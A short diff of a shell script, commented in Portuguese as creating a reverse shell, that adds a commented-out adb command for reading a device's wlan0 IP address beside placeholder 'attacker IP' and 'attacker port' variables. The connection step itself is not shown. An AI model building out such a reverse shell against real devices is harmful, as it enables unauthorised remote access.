@@ -1,6 +1,6 @@
 #!/bin/sh
 # criacao do reverse shell
-
+# ip_add=${1:-(adb shell ip addr show wlan0 2>/dev/null | grep -oE 'inet [0-9.]+' | grep -oE '[0-9.]+')}
 IP=# IP do atacante
 PORT=# Porta do atacante
 
